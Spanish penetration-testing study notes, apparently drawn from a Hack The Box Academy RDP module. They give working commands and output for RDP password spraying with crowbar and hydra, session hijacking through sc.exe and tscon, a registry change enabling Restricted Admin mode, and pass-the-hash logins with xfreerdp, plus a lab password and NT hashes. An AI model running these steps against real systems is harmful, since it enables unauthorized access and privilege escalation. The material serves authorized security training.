---
tags:
  - RDP
---

```
xfreerdp /v:192.168.2.141 /u:admin /pth:**A9FDFA038C4B75EBC76DC855DD74F0DA**
```

```
xfreerdp /u:sadams /p:"totally2brow2harmon@" /v:10.129.139.159 /drive:share,/home/htb-ac-1643998/recurso/mimikatz-master
```


# POR ORGANIZAR

## Configuraciones erróneas

Dado que RDP toma las credenciales de usuario para la autenticación, un vector de ataque común contra el protocolo RDP es la adivinación de contraseñas. Aunque no es común, podríamos encontrar un servicio RDP sin contraseña si hay una configuración incorrecta.

Una advertencia sobre la adivinación de contraseñas contra instancias de Windows es que debe considerar la política de contraseñas del cliente. En muchos casos, una cuenta de usuario se bloqueará o deshabilitará después de un cierto número de intentos fallidos de inicio de sesión. En este caso, podemos realizar una técnica específica de adivinación de contraseñas llamada `Password Spraying`. Esta técnica funciona al intentar una sola contraseña para muchos nombres de usuario antes de probar otra contraseña, teniendo cuidado de evitar el bloqueo de la cuenta.

Usando el [Barra](https://github.com/galkan/crowbar) herramienta, podemos realizar un ataque de pulverización de contraseña contra el servicio RDP. Como ejemplo a continuación, la contraseña `password123` se probará con una lista de nombres de usuario en el `usernames.txt` archivo. El ataque encontró las credenciales válidas como `administrator` : `password123` en el host RDP objetivo.

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

#### Crowbar - RDP Spraying de contraseña

```shell-session
vcrdcr@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

También podemos usar `Hydra` para realizar un ataque de pulverización de contraseña RDP.


#### Hydra - RDP Spraying de contraseña

```shell-session
vcrdcr@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

Podemos RDP en el sistema de destino usando el `rdesktop` cliente o `xfreerdp` cliente con credenciales válidas.



#### Inicio de sesión RDP

```shell-session
vcrdcr@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![Terminal que muestra el comando rdesktop para conectarse a Windows Server 2012 R2 con iconos de escritorio visibles.](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)


## Ataques Específicos del Protocolo

Imaginemos que obtenemos acceso a una máquina con éxito y tenemos una cuenta con privilegios de administrador local. Si un usuario está conectado a través de RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remoto del usuario para escalar nuestros privilegios y hacerse pasar por la cuenta. En un entorno de Active Directory, esto podría resultar en que nos hagamos cargo de una cuenta de Administrador de dominio o promovamos nuestro acceso dentro del dominio.

#### Secuestro de Sesión RDP

Como se muestra en el ejemplo a continuación, iniciamos sesión como usuario `juurena` (UserID = 2) que tiene `Administrator` privilegios. Nuestro objetivo es secuestrar al usuario `lewen` (ID de usuario = 4), que también ha iniciado sesión a través de RDP.

![Escritorio de Windows Server con el Administrador de tareas y PowerShell que muestra las sesiones de usuario.](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)


Para hacerse pasar con éxito por un usuario sin su contraseña, necesitamos tener `SYSTEM` privilegios y usar Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binario que permite a los usuarios conectarse a otra sesión de escritorio. Funciona especificando cuál `SESSION ID` (`4` para el `lewen` sesión en nuestro ejemplo) nos gustaría conectarnos a qué nombre de sesión (`rdp-tcp#13`, que es nuestra sesión actual). Entonces, por ejemplo, el siguiente comando abrirá una nueva consola como se especifica `SESSION_ID` dentro de nuestra sesión actual de RDP:

  Ataque RDP

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Si tenemos privilegios de administrador local, podemos usar varios métodos para obtener `SYSTEM` privilegios, como [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o [Mimikatz](https://github.com/gentilkiwi/mimikatz). Un truco simple es crear un servicio de Windows que, por defecto, se ejecutará como `Local System` y ejecutará cualquier binario con `SYSTEM` privilegios. Usaremos [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binario. Primero, especificamos el nombre del servicio (`sessionhijack`) y el `binpath`, que es el comando que queremos ejecutar. Una vez que ejecutamos el siguiente comando, un servicio llamado `sessionhijack` será creado.

  Ataque RDP

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![Sesión de PowerShell que muestra las consultas del usuario y el comando de creación de servicio con el mensaje de éxito.](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)

Para ejecutar el comando, podemos iniciar el `sessionhijack` servicio :

  Ataque RDP

```cmd-session
C:\htb> net start sessionhijack
```

Una vez iniciado el servicio, un nuevo terminal con el `lewen` aparecerá la sesión de usuario. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y tal vez tengamos suerte, y el usuario es miembro del grupo Help Desk con derechos de administrador para muchos hosts o incluso un Administrador de dominio.

![Sesión de PowerShell que muestra el comando 'whoami' y el Administrador de tareas con sesiones de usuario.](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

_Nota: Este método ya no funciona en Server 2019._

## RDP Pass-the-Hash (PtH)

Es posible que deseemos acceder a aplicaciones o software instalado en el sistema Windows de un usuario que solo está disponible con acceso GUI durante una prueba de penetración. Si tenemos credenciales de texto sin formato para el usuario objetivo, no será un problema para RDP en el sistema. Sin embargo, ¿qué pasa si solo tenemos el hash NT del usuario obtenido de un ataque de dumping de credenciales como [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) base de datos, ¿y no pudimos descifrar el hash para revelar la contraseña de texto sin formato? En algunos casos, podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Hay algunas advertencias a este ataque:

- `Restricted Admin Mode`, que está deshabilitado de forma predeterminada, debe habilitarse en el host de destino; de lo contrario, se nos pedirá el siguiente error:

![Mensaje de error: Las restricciones de cuenta impiden el inicio de sesión debido a contraseñas en blanco, tiempos de inicio de sesión limitados o restricciones de política. OK botón presente.](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Se puede hacer usando el siguiente comando:

#### Agregar la Clave de Registro de DesactivarAdmin Restringido

  Ataque RDP

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Editor del Registro que muestra la ruta: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa. Entrada destacada: DisableRestrictedAdmin, REG_DWORD, valor 0.](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Una vez que se agrega la clave del registro, podemos usar `xfreerdp` con la opción `/pth` para obtener acceso RDP:

  Ataque RDP

```shell-session
vcrdcr@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

Si funciona, ahora iniciaremos sesión a través de RDP como usuario objetivo sin conocer su contraseña en texto claro.

![Sesión de escritorio remoto que muestra PowerShell en Windows Server 2012 R2. Comando 'whoami' ejecutado, salida: 'superstore\lewen'.](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)

Tenga en cuenta que esto no funcionará contra todos los sistemas Windows que encontremos, pero siempre vale la pena intentarlo en una situación en la que tengamos un hash NTLM, sepamos que el usuario tiene derechos RDP contra una máquina o conjunto de máquinas, y el acceso GUI nos beneficiaría de alguna manera para cumplir el objetivo de nuestra evaluación.

